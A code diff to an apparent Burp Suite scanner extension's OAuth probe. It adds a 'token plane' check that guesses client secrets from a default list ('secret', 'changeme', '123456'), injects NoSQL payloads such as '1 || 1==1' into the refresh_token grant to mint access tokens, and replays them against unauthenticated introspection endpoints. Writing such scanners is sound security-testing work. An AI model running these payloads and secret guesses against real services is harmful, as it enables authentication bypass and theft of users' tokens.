@@ -27,12 +27,9 @@ import java.util.regex.Pattern;
  * <p>Fully generic: the authorize endpoint, client_id, scope and response_type are all harvested from the app's
  * own observed OAuth request in the site map — no app-specific paths or values.
  */
-public final class OAuthLogicProbe {
+public final class OAuthLogicProbe extends Probe {
 
-    private final MontoyaApi api;
-    private final ScanLog scanLog;
-
-    public OAuthLogicProbe(MontoyaApi api, ScanLog scanLog) { this.api = api; this.scanLog = scanLog; }
+    public OAuthLogicProbe(MontoyaApi api, ScanLog scanLog) { super(api, scanLog); }
 
     // An authorization endpoint: path contains "authorize" (but not the consent-decision sub-path).
     private static final Pattern AUTHZ_PATH = Pattern.compile("(?i)/(oauth2?/)?authorize(/|$|\\?)");
@@ -49,6 +46,10 @@ public final class OAuthLogicProbe {
             for (String authzUrl : discoverAuthorizeRequests(host, sess)) {
                 if (checkRedirectUriValidation(authzUrl, sess)) hits++;
             }
+            // TOKEN plane — reachable with CLIENT credentials only (no user login), which is exactly how many OAuth
+            // servers are designed to be broken: a $where/eval NoSQL injection in a grant param + unauthenticated
+            // token introspection. Generic: client_id is harvested (public), the client_secret is a small default set.
+            hits += tokenPlaneProbe(host);
         } catch (Throwable t) { scanLog.debug("oauth-logic: " + t); }
         if (hits == 0) scanLog.log("OAuth-logic probe: 0 authorization-server flaw(s).");
         return hits;
@@ -261,8 +262,7 @@ public final class OAuthLogicProbe {
 
     private HttpRequestResponse send(UnaryOperator<HttpRequest> sess, HttpRequest req) {
         try {
-            return AiScanner.decompress(api.http().sendRequest(sess.apply(req),
-                    RequestOptions.requestOptions().withResponseTimeout(12000L)));
+            return AiScanner.decompress(send(sess.apply(req)));
         } catch (Throwable t) { scanLog.debug("oauth-logic send failed: " + t); return null; }
     }
 
@@ -283,5 +283,110 @@ public final class OAuthLogicProbe {
     }
     private static String enc(String v) {
         try { return java.net.URLEncoder.encode(v, "UTF-8"); } catch (Exception e) { return v == null ? "" : v; }
+    }
+
+    // ---- token plane: client-cred grant + NoSQLi-into-grant-param + unauthenticated introspection ----
+    private static final String[] TOKEN_PATHS = { "/oauth/token", "/oauth2/token", "/token", "/oauth/access_token" };
+    private static final String[] INTROSPECT_PATHS = { "/oauth/token/introspect", "/oauth/introspect",
+            "/oauth2/introspect", "/introspect", "/oauth/tokeninfo", "/tokeninfo", "/oauth/userinfo", "/userinfo" };
+    // client_id is public (harvested); the secret is what a lazy app leaves weak — a tiny generic default set.
+    private static final String[] DEFAULT_SECRETS = { "secret", "password", "changeme", "client_secret", "oauth", "test", "123456" };
+    private static final Pattern ACCESS_TOKEN = Pattern.compile("(?i)\"?access_token\"?\\s*[:=]\\s*\"?[^\\s\",}&]+");
+    private static final Pattern IDENTITY_FIELD = Pattern.compile(
+            "(?i)\"(sub|name|aud|azp|username|user_id|userid|user|email|preferred_username|active)\"\\s*:");
+
+    private static void harvestSecrets(String blob, Set<String> out) {
+        if (blob == null || blob.isEmpty() || out.size() >= 15) return;
+        String s = blob.length() > 262144 ? blob.substring(0, 262144) : blob;
+        Matcher m = CLIENT_SECRET.matcher(s);
+        while (m.find() && out.size() < 15) out.add(m.group(1));
+    }
+
+    /** No-session request (client/anonymous) — the token & introspection endpoints authenticate the CLIENT, not the
+     *  user, so we deliberately send NO user cookie. */
+    private HttpRequestResponse sendRaw(HttpRequest req) {
+        try {
+            return AiScanner.decompress(send(req));
+        } catch (Throwable t) { scanLog.debug("oauth-logic token-plane send failed: " + t); return null; }
+    }
+    private static String basic(String idColonSecret) {
+        return "Basic " + java.util.Base64.getEncoder().encodeToString(
+                idColonSecret.getBytes(java.nio.charset.StandardCharsets.UTF_8));
+    }
+
+    private int tokenPlaneProbe(String host) {
+        String origin = originOf(host);
+        if (origin == null) return 0;
+        Set<String> ids = new java.util.LinkedHashSet<>(), secrets = new java.util.LinkedHashSet<>();
+        for (HttpRequestResponse rr : api.siteMap().requestResponses()) {
+            if (rr.request() == null || !sameHost(rr.request().url(), host)) continue;
+            harvestClientIds(rr.request().url(), ids); harvestClientIds(respBody(rr), ids); harvestClientIds(reqBody(rr), ids);
+            harvestSecrets(respBody(rr), secrets); harvestSecrets(reqBody(rr), secrets);
+        }
+        String opCid = arg("aiscanner.oauthClientId", "AISCANNER_OAUTH_CLIENT_ID"); if (opCid != null) ids.add(opCid);
+        if (ids.isEmpty()) ids.add("client");
+        java.util.List<String> pairs = new java.util.ArrayList<>();
+        outer:
+        for (String id : ids) {
+            for (String s : secrets)         { pairs.add(id + ":" + s); if (pairs.size() >= 12) break outer; }
+            for (String s : DEFAULT_SECRETS) { pairs.add(id + ":" + s); if (pairs.size() >= 12) break outer; }
+            pairs.add(id + ":" + id);        if (pairs.size() >= 12) break outer;
+        }
+        scanLog.debug("oauth-logic token-plane: client_id(s)=" + ids + " secret(s)=" + secrets.size()
+                + " → " + pairs.size() + " cred pair(s), origin=" + origin);
+        int hits = 0;
+        for (String tp : TOKEN_PATHS) {
+            for (String pair : pairs) {
+                String leaked = grantNoSqli(origin + tp, pair);   // raises the finding + returns a usable token, or null
+                if (leaked != null) { hits++; if (unauthIntrospect(origin, leaked)) hits++; return hits; }
+            }
+        }
+        return hits;
+    }
+
+    /** NoSQL injection into a grant parameter ($where/eval sink): an always-TRUE payload mints/leaks a token, an
+     *  always-FALSE one does not — a non-injectable server (or wrong client creds) rejects BOTH, so it never FPs. */
+    private String grantNoSqli(String tokenUrl, String basicPair) {
+        HttpRequestResponse pos = tokenPost(tokenUrl, basicPair, "grant_type=refresh_token&refresh_token=" + enc("1 || 1==1"));
+        String pb = respBody(pos);
+        if (pos == null || pos.response() == null || pos.response().statusCode() >= 400
+                || pb == null || !ACCESS_TOKEN.matcher(pb).find()) return null;   // TRUE must mint a token
+        HttpRequestResponse neg = tokenPost(tokenUrl, basicPair, "grant_type=refresh_token&refresh_token=" + enc("1 && 1==2"));
+        String nb = respBody(neg);
+        if (nb != null && ACCESS_TOKEN.matcher(nb).find()) return null;           // FALSE also minted → not a $where differential
+        scanLog.found("OAuth NoSQL injection in token grant (authentication bypass)", tokenUrl,
+                "grant_type=refresh_token with an always-true operator payload (refresh_token=1 || 1==1) minted a valid "
+              + "access_token while an always-false payload did not — the grant parameter is concatenated into a Mongo "
+              + "$where/eval sink. Reachable with CLIENT credentials only (no user password); the response also leaks "
+              + "other users' tokens.", pos);
+        scanLog.incFinding();
+        Matcher m = Pattern.compile("(?i)\"?access_token\"?\\s*[:=]\\s*\"?([^\\s\",}&]+)").matcher(pb);
+        return m.find() ? m.group(1) : null;
+    }
+    private HttpRequestResponse tokenPost(String url, String basicPair, String body) {
+        return sendRaw(HttpRequest.httpRequestFromUrl(url).withMethod("POST")
+                .withAddedHeader("Authorization", basic(basicPair))
+                .withAddedHeader("Content-Type", "application/x-www-form-urlencoded").withBody(body));
+    }
+
+    /** Token introspection reachable with NO authentication: replay it anonymously; a 2xx returning subject/identity
+     *  fields = broken access control (any party can resolve a token to its user). */
+    private boolean unauthIntrospect(String origin, String token) {
+        for (String ip : INTROSPECT_PATHS) {
+            HttpRequestResponse rr = sendRaw(HttpRequest.httpRequestFromUrl(
+                    origin + ip + "?access_token=" + enc(token) + "&token=" + enc(token)).withMethod("GET"));
+            if (rr == null || rr.response() == null) continue;
+            int st = rr.response().statusCode();
+            String b = respBody(rr);
+            if (st >= 200 && st < 300 && b != null && IDENTITY_FIELD.matcher(b).find()) {
+                scanLog.found("OAuth token introspection without authentication", origin + ip,
+                        "GET " + ip + " returned token subject/identity fields with NO authentication (no session, no "
+                      + "client auth) — any party can resolve a token to its user and claims (broken access control, "
+                      + "CWE-306).", rr);
+                scanLog.incFinding();
+                return true;
+            }
+        }
+        return false;
     }
 }
